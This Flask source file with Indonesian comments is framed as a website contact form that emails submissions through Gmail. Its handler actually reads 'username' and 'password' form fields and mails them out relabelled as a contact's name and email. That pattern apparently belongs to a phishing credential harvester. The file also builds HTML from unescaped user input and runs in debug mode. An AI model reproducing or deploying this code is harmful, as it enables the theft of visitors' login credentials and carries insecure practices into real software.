# app.py
from flask import Flask, request, render_template, redirect, url_for, flash
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
from email.utils import formataddr
from dotenv import load_dotenv

# Load .env kalau ada (opsional)
load_dotenv()

app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET_KEY", "dev-secret")  # hanya untuk flash message di dev

# Config via environment variables (set di server / .env)
SMTP_USER = os.environ.get("GMAIL_USER")         # contoh: youremail@gmail.com
SMTP_APP_PASS = os.environ.get("GMAIL_APP_PASS") # 16-char App Password
RECEIVER_EMAIL = os.environ.get("RECEIVER_EMAIL", SMTP_USER)  # kemana form dikirimkan

if not SMTP_USER or not SMTP_APP_PASS:
    print("⚠️ Warning: SMTP credentials not set. Set GMAIL_USER and GMAIL_APP_PASS in env.")

@app.route("/", methods=["GET"])
def index():
    return render_template("index.html")

@app.route("/submit", methods=["POST"])
def submit():
    # Ambil data dari form
    name = request.form.get("username", "").strip()
    email = request.form.get("password", "").strip()

    # Validasi sederhana
    if not name or not email:
        flash("Please fill all fields", "error")
        return redirect(url_for("index"))

    # Buat konten email HTML (inline style sederhana)
    html_content = f"""
    <html>
      <body style="font-family:Arial, sans-serif; background:#111; color:#fff; padding:20px;">
        <h2 style="color:#fff;">New Contact Message</h2>
        <table cellpadding="0" cellspacing="0" style="width:100%; max-width:600px;">
          <tr><td style="padding:8px;"><strong>Name</strong></td><td style="padding:8px;">{name}</td></tr>
          <tr><td style="padding:8px;"><strong>Email</strong></td><td style="padding:8px;">{email}</td></tr>
        </table>
      </body>
    </html>
    """

    plain_text = f"New contact message\n\nName: {name}\nEmail: {email}"

    # Siapkan MIME
    msg = MIMEMultipart("alternative")
    display_sender_name = os.environ.get("SENDER_NAME", "Website Contact")
    msg["Subject"] = f"Contact form: {name}"
    msg["From"] = formataddr((display_sender_name, SMTP_USER))
    msg["To"] = RECEIVER_EMAIL

    part1 = MIMEText(plain_text, "plain")
    part2 = MIMEText(html_content, "html")
    msg.attach(part1)
    msg.attach(part2)

    # Kirim via Gmail SMTP (SSL)
    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(SMTP_USER, SMTP_APP_PASS)
            server.sendmail(SMTP_USER, RECEIVER_EMAIL, msg.as_string())
    except Exception as e:
        # Log error dan beri feedback ke user
        print("Failed to send email:", e)
        flash("Failed to send message. Please try again later.", "error")
        return redirect(url_for("index"))

    flash("Message sent successfully! Thank you.", "success")
    return redirect(url_for("index"))

if __name__ == "__main__":
    app.run(debug=True)
